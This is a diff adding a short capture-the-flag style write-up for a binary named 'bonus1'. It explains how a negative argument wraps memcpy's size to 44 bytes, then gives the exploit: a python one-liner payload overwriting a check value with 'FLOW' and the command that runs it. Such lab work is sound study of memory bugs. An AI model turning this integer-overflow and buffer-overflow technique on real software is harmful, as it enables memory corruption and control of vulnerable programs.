@@ -1,0 +1,11 @@
+The program expects a value less than 10;
+To access next bonus's it should be equals to 1464814662
+on memcpy this value will be multipled by 4 and converted to unsigned int
+with memcpy whe should copy 44 bytes from argv[2] so we can overflow the value
+
+negative_number * 4 = 44
+
+
+python -c "print('a'*40 + '\x46\x4c\x4f\x57' )" > /tmp/lua1
+
+./bonus1 -2147483637 $(cat /tmp/lua1)
